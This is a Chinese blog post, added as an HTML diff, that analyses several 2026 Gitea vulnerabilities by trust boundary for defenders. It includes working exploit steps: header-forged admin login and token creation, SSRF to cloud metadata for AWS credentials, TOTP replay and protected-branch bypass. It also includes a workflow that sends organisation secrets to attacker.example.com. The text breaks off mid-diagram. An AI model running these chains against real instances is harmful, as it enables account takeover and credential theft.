@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gitea同日5个Critical信任边界拆解——从一个Header到全域沦陷的DevOps安全审计 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Gitea同日5个Critical信任边界拆解——从一个Header到全域沦陷的DevOps安全审计</h1>
+<time>2026-07-27</time>
+<ul>
+<li>技术
+Slug: gitea同日5个critical信任边界拆解-从一个header到全域沦陷的devops安全审计</li>
+</ul>
+<hr />
+<h2>0. 背景与写作视角</h2>
+<p>2026年某次例行安全发布中，Gitea在同一天集中披露了9个安全漏洞，其中5个为Critical/High级别，CVSS最高9.8。这并非一次"零散bug补丁"——把9个CVE放到同一张信任边界地图上，会发现它们落在5条不同的信任链上，而每一条链上都有一个"边界被静默绕过"的设计模式。</p>
+<p>本文不做漏洞公告的翻译，而是回答三个工程问题：</p>
+<ol>
+<li><strong>为什么这5个洞会在同一时间集中爆发？</strong>——共因是"默认信任"哲学。</li>
+<li><strong>作为平台方，如何在一周内自证未受影响？</strong>——给出可执行的<code>grep</code>规则与日志查询。</li>
+<li><strong>作为防御方，如何避免下一个同类洞？</strong>——给出信任边界设计模式层面的复盘。</li>
+</ol>
+<p>读者画像：自建Gitea实例的运维；CI/CD平台负责人；关注供应链安全的蓝队。</p>
+<hr />
+<h2>1. 漏洞全景表</h2>
+<p>为方便后续分析，先把9个CVE按"信任边界"维度重新组织。注意CVSS仅作优先级参考，真正的风险取决于部署上下文（例如CVE-2026-20896在裸机二进制部署下风险为0，在官方Docker镜像下风险为9.8）。</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>CVSS</th>
+<th>类型</th>
+<th>信任边界</th>
+<th>一句话</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-20896</td>
+<td>9.8</td>
+<td>认证绕过</td>
+<td>网络信任</td>
+<td>Docker镜像默认<code>REVERSE_PROXY_TRUSTED_PROXIES=*</code>，一个<code>X-WEBAUTH-USER</code> header冒充任意用户</td>
+</tr>
+<tr>
+<td>CVE-2026-58443</td>
+<td>9.6</td>
+<td>越权</td>
+<td>仓库信任</td>
+<td>public-only token越权推送私有仓库PR，破坏权限隔离</td>
+</tr>
+<tr>
+<td>CVE-2026-58426</td>
+<td>9.6</td>
+<td>隔离失效</td>
+<td>任务隔离</td>
+<td>HMAC签名歧义导致跨仓库artifact读写</td>
+</tr>
+<tr>
+<td>CVE-2026-22874</td>
+<td>9.6</td>
+<td>SSRF</td>
+<td>网络安全</td>
+<td>Go标准库<code>net.IP.IsPrivate()</code>覆盖不全，RFC 6598 CGN地址(<code>100.64.0.0/10</code>)和云元数据(<code>169.254.169.254</code>)可达</td>
+</tr>
+<tr>
+<td>CVE-2026-56750</td>
+<td>—</td>
+<td>会话</td>
+<td>会话信任</td>
+<td>Remember-Me token被盗后不失效攻击者会话</td>
+</tr>
+<tr>
+<td>CVE-2026-20779</td>
+<td>7.1</td>
+<td>2FA绕过</td>
+<td>认证信任</td>
+<td>TOTP TOCTOU竞态条件，一个OTP在web登录/密码重置/Basic-Auth三处重复使用</td>
+</tr>
+<tr>
+<td>CVE-2026-27775</td>
+<td>High</td>
+<td>提权</td>
+<td>权限信任</td>
+<td>push多ref时缓存第一个ref的写权限检查，分支维护者提升为全仓库写权限</td>
+</tr>
+<tr>
+<td>GHSA-rjvx-x5h2-6px5</td>
+<td>High</td>
+<td>API绕过</td>
+<td>API信任</td>
+<td>组织成员通过API fork绕过仓库创建限制，注入Actions工作流窃取组织CI/CD secrets</td>
+</tr>
+<tr>
+<td>CVE-2026-24451</td>
+<td>High</td>
+<td>信息泄露</td>
+<td>仓库信任</td>
+<td>Fork同步在父仓库变私后继续</td>
+</tr>
+</tbody>
+</table>
+<p>5个Critical/High的"信任边界"分布如下（ASCII示意）：</p>
+<div class="highlight"><pre><span></span><code>                       ┌──────────────────────────────────────────┐
+                       │           Gitea Instance                 │
+   Internet ──────────▶│                                          │
+                       │  ┌─────────────┐   ┌──────────────────┐  │
+   [网络信任]           │  │ Reverse Proxy│  │  Webhook/Migrate │  │
+   CVE-2026-20896 ────▶│  │  X-WEBAUTH   │  │  SSRF Filter     │  │
+   CVE-2026-22874 ────▶│  └──────┬──────┘   └────────┬─────────┘  │
+                       │         │                   │            │
+                       │  ┌──────▼───────────────────▼─────────┐  │
+                       │  │       AuthN / AuthZ Layer          │  │
+   [认证/会话信任]      │  │  TOTP(20779)  RememberMe(56750)    │  │
+                       │  └──────┬──────────────────────────────┘  │
+                       │         │                                 │
+                       │  ┌──────▼──────────────────────────────┐  │
+   [仓库/权限信任]      │  │  Repo ACL  Push Ref(27775)          │  │
+   CVE-2026-58443 ────▶│  │  Fork API(rjvx)  Fork Sync(24451)   │  │
+                       │  └──────┬──────────────────────────────┘  │
+                       │  ┌──────▼──────────────────────────────┐  │
+   [任务隔离信任]       │  │  Actions Runner / Artifact Store    │  │
+   CVE-2026-58426 ────▶│  │  HMAC Scope Boundary                │  │
+                       │  └─────────────────────────────────────┘  │
+                       └──────────────────────────────────────────┘
+</code></pre></div>
+
+<p>后续章节按"网络信任 → 网络安全 → 认证信任 → 权限/API信任 → 任务隔离信任"顺序逐个拆解。</p>
+<hr />
+<h2>2. CVE-2026-20896：一个Header改写身份（9.8 Critical）</h2>
+<h3>2.1 漏洞本质</h3>
+<p>Gitea支持反向代理认证（<code>REVERSE_PROXY_AUTHENTICATION_USER</code>），其设计假设是：<strong>反向代理已对用户完成认证，并在请求头中注入可信的身份声明</strong>。Gitea本身只校验"请求来源IP是否在<code>REVERSE_PROXY_TRUSTED_PROXIES</code>列表内"，若在列表内，则直接信任<code>X-WEBAUTH-USER</code> header的值作为当前登录用户。</p>
+<p>问题出在官方Docker镜像的<code>app.ini</code>模板：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 官方Docker镜像内 /data/gitea/conf/app.ini 片段（漏洞版本）</span>
+<span class="k">[security]</span>
+<span class="na">REVERSE_PROXY_AUTHENTICATION_USER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">enabled</span>
+<span class="na">REVERSE_PROXY_TRUSTED_PROXIES</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s">*</span>
+</code></pre></div>
+
+<p><code>*</code> 表示信任任何来源IP。文档默认值是<code>127.0.0.0/8,::1/128</code>（仅loopback），但Docker镜像在模板里把它覆盖成<code>*</code>，导致Gitea实例一旦暴露在3000端口（且未走真正的反代），任何人都可用一个header冒充任意用户。</p>
+<h3>2.2 利用链</h3>
+<p>利用极其简单，门槛接近0：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 直接以admin身份登录目标实例（前提：3000端口可达）</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-WEBAUTH-USER: admin&quot;</span><span class="w"> </span>http://target:3000/
+
+<span class="c1"># 拉取admin可见的全部仓库列表</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-WEBAUTH-USER: admin&quot;</span><span class="w"> </span>http://target:3000/api/v1/repos/list
+
+<span class="c1"># 创建一个拥有admin scope的token，持久化访问</span>
+curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-WEBAUTH-USER: admin&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;backdoor&quot;,&quot;scopes&quot;:[&quot;write:admin&quot;,&quot;read:issue&quot;,&quot;write:repository&quot;]}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>http://target:3000/api/v1/users/admin/tokens
+</code></pre></div>
+
+<p>整条链路只有一步：发一个带header的HTTP请求。这把"网络信任"边界从"反代后端"直接推到了"公网任意IP"。</p>
+<h3>2.3 影响面判断</h3>
+<ul>
+<li><strong>受影响</strong>：使用官方Docker镜像（<code>gitea/gitea</code>）且3000端口可达外部。</li>
+<li><strong>不受影响</strong>：二进制分发、自建部署，它们使用<code>app.example.ini</code>里的loopback默认值；或在反代后用<code>REVERSE_PROXY_LIMITER</code>严格限制源IP。</li>
+<li><strong>修复</strong>：PR #38151，从Docker模板中删除这两行配置，回退到<code>app.example.ini</code>的loopback默认。</li>
+</ul>
+<h3>2.4 为什么这种洞最危险</h3>
+<p>它直接击穿了<strong>DevOps平台的"身份"原语</strong>。Gitea后面所有的权限模型——仓库ACL、Actions secret访问、CI凭据下发——都以"当前用户身份可信"为前提。一旦身份可被一个header改写，下游所有信任边界都失效。这就是为什么把它排在第一。</p>
+<hr />
+<h2>3. CVE-2026-22874：标准库盲区导致SSRF可达云元数据（9.6 Critical）</h2>
+<h3>3.1 漏洞本质</h3>
+<p>Gitea的webhook触发、仓库迁移（migrate）、Actions runner注册等场景都会主动发起出站HTTP请求。为防止SSRF，Gitea实现了一个IP白名单/黑名单过滤器，过滤逻辑大量复用Go标准库的<code>net.IP.IsPrivate()</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 漏洞版本Gitea的SSRF过滤伪代码</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">isBlocked</span><span class="p">(</span><span class="nx">ip</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">)</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">IsLoopback</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">IsPrivate</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">IsLinkLocalUnicast</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// ... 业务侧补充规则</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>问题在于，Go 1.17之前（以及部分后续版本的实现细节）<code>net.IP.IsPrivate()</code>只覆盖RFC 1918的三段私有地址：</p>
+<div class="highlight"><pre><span></span><code><span class="mf">10.0.0.0</span><span class="o">/</span><span class="mf">8</span>
+<span class="mf">172.16.0.0</span><span class="o">/</span><span class="mf">12</span>
+<span class="mf">192.168.0.0</span><span class="o">/</span><span class="mf">16</span>
+</code></pre></div>
+
+<p>而以下两段"事实私有但标准库未覆盖"的地址未被拦截：</p>
+<ul>
+<li><strong>RFC 6598 CGN地址</strong>：<code>100.64.0.0/10</code>（运营商级NAT，常被云商用作内网Pod网段）</li>
+<li><strong>Link-local元数据地址</strong>：<code>169.254.169.254</code>（AWS/GCE/Azure云元数据服务）</li>
+</ul>
+<h3>3.2 利用链：从webhook到AWS IAM临时凭据</h3>
+<p>攻击者只需拥有一个普通账号（甚至只需public仓库的写权限即可创建webhook）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 在自己控制的仓库里配置一个webhook，URL指向云元数据</span>
+<span class="c1">#    URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</span>
+
+<span class="c1"># 2. 触发webhook（push一次即可）</span>
+git<span class="w"> </span>commit<span class="w"> </span>--allow-empty<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;trigger&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>git<span class="w"> </span>push
+
+<span class="c1"># 3. 在webhook delivery历史里查看返回体</span>
+<span class="c1">#    Gitea会把响应体回显在 &quot;Delivery Details&quot; 页面：</span>
+<span class="c1">#    {</span>
+<span class="c1">#      &quot;AccessKeyId&quot;: &quot;ASIA...&quot;,</span>
+<span class="c1">#      &quot;SecretAccessKey&quot;: &quot;wJalrXUtn...&quot;,</span>
+<span class="c1">#      &quot;Token&quot;: &quot;IQoJb3Jp...&quot;,</span>
+<span class="c1">#      &quot;Expiration&quot;: &quot;2026-07-27T...&quot;</span>
+<span class="c1">#    }</span>
+</code></pre></div>
+
+<p>拿到的临时凭据可直接用于AWS CLI：</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>ASIA...
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>wJalrXUtn...
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>IQoJb3Jp...
+aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w">            </span><span class="c1"># 列出该IAM角色可访问的全部S3 bucket</span>
+aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+</code></pre></div>
+
+<p>完整的攻击链：</p>
+<div class="highlight"><pre><span></span><code><span class="k">[普通用户] ──push──▶ [Gitea webhook]</span>
+<span class="w">                          </span><span class="na">│</span>
+<span class="w">                          </span><span class="na">│ 发起HTTP请求</span>
+<span class="w">                          </span><span class="na">▼</span>
+<span class="w">                  </span><span class="k">[SSRF过滤器 IsPrivate()]</span>
+<span class="w">                          </span><span class="na">│</span>
+<span class="w">                          </span><span class="na">│ 169.254.169.254 不在RFC1918 → 放行</span>
+<span class="w">                          </span><span class="na">▼</span>
+<span class="w">                  </span><span class="k">[AWS IMDSv1 元数据服务]</span>
+<span class="w">                          </span><span class="na">│</span>
+<span class="w">                          </span><span class="na">│ 返回IAM临时凭据</span>
+<span class="w">                          </span><span class="na">▼</span>
+<span class="w">                  </span><span class="k">[webhook delivery响应体回显]</span>
+<span class="w">                          </span><span class="na">│</span>
+<span class="w">                          </span><span class="na">▼</span>
+<span class="w">                  </span><span class="k">[攻击者拿到IAM凭据 → 横向到云上资源]</span>
+</code></pre></div>
+
+<p>PoC已公开：<code>https://github.com/Eliot-code/CVE-2026-22874-PoC</code>。这意味着该洞的实战利用率非常高，任何跑在AWS/GCE/Azure上的Gitea实例，只要允许普通用户创建webhook或migrate仓库，都应视为已被攻陷。</p>
+<h3>3.3 修复方向</h3>
+<p>Gitea侧的修复分两层：</p>
+<ol>
+<li><strong>业务侧补充黑名单</strong>：在<code>isBlocked</code>里显式加入<code>100.64.0.0/10</code>、<code>169.254.0.0/16</code>、<code>0.0.0.0/8</code>、IPv6的<code>fc00::/7</code>、<code>fe80::/10</code>等。</li>
+<li><strong>依赖Go 1.18+</strong>：Go 1.18起<code>net.IP.IsPrivate()</code>已覆盖RFC 4193（IPv6 ULA）但<strong>仍未覆盖RFC 6598</strong>——这是Go标准库一个长期未闭合的issue，平台方不能依赖标准库兜底。</li>
+</ol>
+<p>更深一层的修复是强制IMDSv2（见第8节）。</p>
+<hr />
+<h2>4. CVE-2026-20779：TOTP跨surface重放（7.1 High）</h2>
+<h3>4.1 漏洞本质</h3>
+<p>TOTP（Time-based One-Time Password）的安全模型要求"一个OTP code在一次有效窗口（通常30秒）内只能被使用一次"。Gitea在1.26.3之前实现了"已用code标记"机制，但这个标记是<strong>按surface隔离</strong>的：</p>
+<ul>
+<li>Web登录页 <code>/user/login</code> 有一个<code>usedOTP</code>集合</li>
+<li>密码重置流程 <code>/user/forgot_password</code> 有另一个<code>usedOTP</code>集合</li>
+<li>Basic-Auth场景下从<code>X-Gitea-OTP</code> header读取OTP，又有一套独立判断</li>
+</ul>
+<p>这导致同一个6位TOTP code在30秒窗口内，可以<strong>同时</strong>用于三个不同的认证面。结合TOCTOU（Time-of-Check-to-Time-of-Use）竞态——check与mark-used不是原子的——攻击者用并发请求即可在同一秒内复用同一个code。</p>
+<h3>4.2 利用链</h3>
+<p>前提：攻击者已通过钓鱼/中间人/键盘嗅探拿到受害者的当前TOTP code（30秒窗口）。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 攻击者在30秒内并发发起三个请求</span>
+<span class="c1"># (1) Web登录</span>
+curl<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target:3000/user/login<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;user_name=victim&amp;password=&lt;已知密码&gt;&amp;totp=&lt;OTP&gt;&quot;</span>
+
+<span class="c1"># (2) 同时发起密码重置确认</span>
+curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target:3000/user/recover_account<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;totp=&lt;同一个OTP&gt;&quot;</span>
+
+<span class="c1"># (3) 同时用Basic-Auth拉API</span>
+curl<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;victim:&lt;已知密码&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Gitea-OTP: &lt;同一个OTP&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://target:3000/api/v1/users/victim/tokens
+</code></pre></div>
+
+<p>在三套<code>usedOTP</code>集合合并前，三个请求至少有一个能绕过"单次使用"约束。修复版本（1.26.3）把三套集合合并为全局唯一的<code>usedOTP</code>，并在check-mark之间加锁。</p>
+<h3>4.3 为什么CVSS只有7.1但实际危害大</h3>
+<p>CVSS打分考虑了"需要受害者凭据"这一前提，所以分不高。但在真实攻击链里，TOTP通常是最后一道防线——一旦被重放，意味着2FA形同虚设。配合CVE-2026-56750（Remember-Me token被盗后不失效攻击者会话），可形成"窃取凭据 → 绕2FA → 持久化会话"的完整链条。</p>
+<hr />
+<h2>5. CVE-2026-27775：多ref push的权限缓存陷阱（High）</h2>
+<h3>5.1 漏洞本质</h3>
+<p>Git协议允许一次<code>push</code>同时更新多个ref，例如：</p>
+<div class="highlight"><pre><span></span><code>git<span class="w"> </span>push<span class="w"> </span>origin<span class="w"> </span>feature-a<span class="w"> </span>feature-b<span class="w"> </span>main<span class="w"> </span>refs/tags/v1.0
+</code></pre></div>
+
+<p>Gitea在处理multi-ref push时，对每个ref都要做权限检查（该用户对该分支是否有写权限）。漏洞版本的实现把<strong>第一个ref的检查结果缓存</strong>下来，后续ref直接复用：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 漏洞版本伪代码（简化）</span>
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">s</span><span class="w"> </span><span class="o">*</span><span class="nx">PushService</span><span class="p">)</span><span class="w"> </span><span class="nx">checkAllRefs</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">push</span><span class="w"> </span><span class="o">*</span><span class="nx">Push</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">cachedCanWrite</span><span class="w"> </span><span class="kt">bool</span><span class="w">   </span><span class="c1">// ← 缓存变量</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">cachedChecked</span><span class="w"> </span><span class="kt">bool</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">ref</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">push</span><span class="p">.</span><span class="nx">Refs</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">cachedChecked</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">cachedCanWrite</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">repo</span><span class="p">.</span><span class="nx">CanWrite</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">push</span><span class="p">.</span><span class="nx">User</span><span class="p">,</span><span class="w"> </span><span class="nx">ref</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">cachedChecked</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 后续ref直接用 cachedCanWrite，跳过实际权限校验</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">cachedCanWrite</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">ErrForbidden</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">s</span><span class="p">.</span><span class="nx">applyRef</span><span class="p">(</span><span class="nx">ref</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>5.2 利用链：分支维护者 → 全仓库写权限</h3>
+<p>Gitea支持"branch protection"下的"分支维护者"角色：用户对受保护分支没有直接写权限，但被指定为该分支的maintainer，可以批准/合并PR。漏洞让该用户通过精心构造的multi-ref push，把权限从"某分支maintainer"提升到"全仓库write"。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 场景：alice是 feature/* 分支的maintainer，对 main 无写权限</span>
+<span class="c1"># 攻击：把第一个ref设为 alice 有权写的分支，第二个ref设为 main</span>
+
+git<span class="w"> </span>checkout<span class="w"> </span>-b<span class="w"> </span>feature/pwn
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;backdoor&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>backdoor.txt
+git<span class="w"> </span>add<span class="w"> </span>backdoor.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;pwn&quot;</span>
+
+<span class="c1"># 同时push两个ref：第一个通过权限检查并缓存，第二个直接复用缓存结果</span>
+git<span class="w"> </span>push<span class="w"> </span>origin<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>HEAD:refs/heads/feature/pwn<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>HEAD:refs/heads/main<span class="w">          </span><span class="c1"># ← 本应被拒，但复用了缓存→放行</span>
+</code></pre></div>
+
+<p>结果：<code>main</code>分支被直接写入，绕过branch protection。如果<code>main</code>触发CD流水线，攻击者下一步即可篡改部署产物。</p>
+<h3>5.3 修复</h3>
+<p>把权限检查从"按push缓存"改为"按ref独立校验"，并确保check与use在同一事务内，避免TOCTOU。</p>
+<hr />
+<h2>6. GHSA-rjvx-x5h2-6px5：API fork绕过窃取组织secrets（High）</h2>
+<h3>6.1 漏洞本质</h3>
+<p>Gitea的"组织仓库创建"在Web UI和API两条路径上权限校验不一致：</p>
+<ul>
+<li><strong>Web UI</strong>：创建仓库前检查<code>CanCreateOrgRepo</code>权限（仅owner/team admin拥有）。</li>
+<li><strong>API <code>/api/v1/repos/{org}/{repo}/fork</code></strong>：fork端点不检查<code>CanCreateOrgRepo</code>，只检查"源仓库是否可fork"。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">// 漏洞版本伪代码</span>
+<span class="c1">// Web UI路径</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">CreateOrgRepo</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">org</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">org</span><span class="p">.</span><span class="nx">CanCreateOrgRepo</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ErrForbidden</span><span class="w">       </span><span class="c1">// ← 普通成员被拦</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">createRepo</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">org</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="c1">// API fork路径</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">ForkRepo</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">srcRepo</span><span class="p">,</span><span class="w"> </span><span class="nx">dstOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">srcRepo</span><span class="p">.</span><span class="nx">CanBeForkedBy</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ErrForbidden</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// ← 缺少：dstOwner.CanCreateOrgRepo(user) 检查</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">createFork</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">srcRepo</span><span class="p">,</span><span class="w"> </span><span class="nx">dstOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>6.2 利用链：fork → 启用Actions → 注入工作流 → 窃取secrets</h3>
+<p>组织级CI/CD secrets通常配置在组织层面，组织内所有启用Actions的仓库都可读取。漏洞让任意组织成员都能在组织名下fork出一个<strong>自己作为admin</strong>的仓库：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># alice是 org-a 的普通成员，没有创建仓库权限</span>
+<span class="c1"># 但可以通过API fork组织仓库到 org-a 名下</span>
+curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: token &lt;alice-token&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;organization&quot;:&quot;org-a&quot;}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://target:3000/api/v1/repos/org-a/secret-repo/forks
+
+<span class="c1"># 新仓库 org-a/secret-repo-fork 中，alice是admin</span>
+<span class="c1"># 1. 启用Actions</span>
+curl<span class="w"> </span>-X<span class="w"> </span>PATCH<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: token &lt;alice-token&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;has_actions&quot;:true}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>http://target:3000/api/v1/repos/org-a/secret-repo-fork
+
+<span class="c1"># 2. 注入工作流，读取组织级secrets</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>.gitea/workflows/exfil.yml<span class="w"> </span><span class="s">&lt;&lt;&#39;YAML&#39;</span>
+<span class="s">name: exfil</span>
+<span class="s">on: [push]</span>
+<span class="s">jobs:</span>
+<span class="s">  exfil:</span>
+<span class="s">    runs-on: ubuntu-latest</span>
+<span class="s">    steps:</span>
+<span class="s">      - run: |</span>
+<span class="s">          echo &quot;${{ secrets.ORG_DEPLOY_KEY }}&quot; | curl -X POST \</span>
+<span class="s">            -d @- https://attacker.example.com/collect</span>
+<span class="s">YAML</span>
+git<span class="w"> </span>add<span class="w"> </span>.gitea/workflows/exfil.yml
+git<span class="w"> </span>commit<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;ci&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>git<span class="w"> </span>push
+</code></pre></div>
+
+<p>工作流在Gitea Actions runner上执行时，<code>secrets.ORG_DEPLOY_KEY</code>会被注入环境变量，攻击者通过curl把明文外发。</p>
+<h3>6.3 攻击链全景</h3>
+<div class="highlight"><pre><span></span><code><span class="k">[组织普通成员 alice]</span>
+<span class="w">        </span><span class="na">│</span>
+<span class="w">        </span><span class="na">│ API fork（绕过 CanCreateOrgRepo）</span>
+<span class="w">        </span><span class="na">▼</span>
+<span class="k">[org-a/secret-repo-fork  ← alice是admin]</span>
+<span class="w">        </span><span class="na">│</span>
+<span class="w">        </span><span class="na">│ 启用Actions + 注入工作流</span>
+<span class="w">        </span><span class="na">▼</span>
+<span class="k">[Gitea Actions Runner]</span>
+<span class="w">        </span><span class="na">│</span>
+<span class="w">        </span><span class="na">│ 渲染 secrets.ORG_DEPLOY_KEY 到环境变量</span>
+<span class="w">        </span><span class="na">▼</span>
+<span class="k">[工作流step执行 curl 外发]</span>
+<span class="w">        </span><span class="na">│</span>
